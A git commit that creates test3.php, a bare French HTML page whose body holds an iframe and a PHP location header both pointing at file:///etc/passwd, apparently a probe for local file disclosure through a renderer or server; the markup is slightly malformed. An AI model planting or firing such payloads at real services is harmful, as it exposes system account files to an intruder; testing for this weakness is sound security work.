2f145561c7e30b5ce89a8b88e5cae6492e718792
Bastien Deweze <82615930+BastienDeweze@users.noreply.github.com>
2025-02-08 22:11:43 +0100

    Create test3.php

---
+++ test3.php
@@ -0,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Page de base</title>
+    
+    </style>
+</head>
+<body>
+
+    <iframe src="file:///etc/passwd" height="500" width="500">
+
+<?php
+
+header("location:file:///etc/passwd");
+
+?>
+
+</body>
+</html>
